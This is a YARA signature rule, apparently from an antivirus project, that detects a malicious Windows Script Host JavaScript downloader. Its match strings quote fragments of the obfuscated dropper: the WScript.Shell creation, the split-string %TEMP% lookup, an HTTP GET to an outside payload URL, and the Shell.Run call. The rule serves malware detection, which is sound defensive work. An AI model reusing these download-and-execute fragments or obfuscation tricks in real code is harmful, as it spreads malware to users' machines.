rule sig_20160427_4f341431296afe65d44c44c1824e0c8d {
  meta:
    description = "datamaliciousorder - file 20160427_4f341431296afe65d44c44c1824e0c8d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dad9429bc12889d75c39e896eb343596b8ca8e657823927c20adf5e8f7248ccd"

  strings:
    $s1  = "function TpfqyXhpda() {return JnwyfWtdhz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZYVW84s" ascii
    $s2  = "function TpfqyXhpda() {return JnwyfWtdhz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZYVW84s" ascii
    $s3  = "function HoeplToncl(JqluzOdaou, XbayqTsnzc){NifhpNiamw = NifhpNiamw * 1; return JqluzOdaou - XbayqTsnzc;};" fullword ascii
    $s4  = "var JnwyfWtdhz = function KqjqfRzdqh() {return UccoiDkwvr[YfydfWrowo](\"WScript\"+\".Shell\");}(), YyssbQfhfm = 11;" fullword ascii
    $s5  = "FxjifEeurd[XpxstBkcvj](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "var UccoiDkwvr = this[\"WScript\"];" fullword ascii
    $s7  = "if (FxjifEeurd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function IutnwRkjgl(){return SyufwHwbiq + \"\";};" fullword ascii
    $s9  = "function NhxsnUbdnf() {return ((XckkeKylox == true) && (XckkeKylox == PkgjcPcqpw)) ? 1 : NifhpNiamw;};" fullword ascii
    $s10 = "var XckkeKylox = false;" fullword ascii
    $s11 = "var PkgjcPcqpw = false;" fullword ascii
    $s12 = "var AgkrwXkdlx = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function TjejeFhsbe(){return 23;};" fullword ascii
    $s14 = "PkgjcPcqpw = true; " fullword ascii
    $s15 = "function InceyVnxtm(ZggyzTwcpc){JnwyfWtdhz[\"R\"+\"un\"](ZggyzTwcpc, NifhpNiamw, NifhpNiamw);};" fullword ascii
    $s16 = "var UrfcqNibwm = false;" fullword ascii
    $s17 = "function KlqtlQulfn(){return YfydfWrowo;};" fullword ascii
    $s18 = "}while (HrrsfZwwpi);" fullword ascii
    $s19 = "function UcdikHuwrk(YyzypKevtj) {var LhazpClqew = (1, 2, 3, 4, 5, YyzypKevtj); return LhazpClqew;};" fullword ascii
    $s20 = "XckkeKylox = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}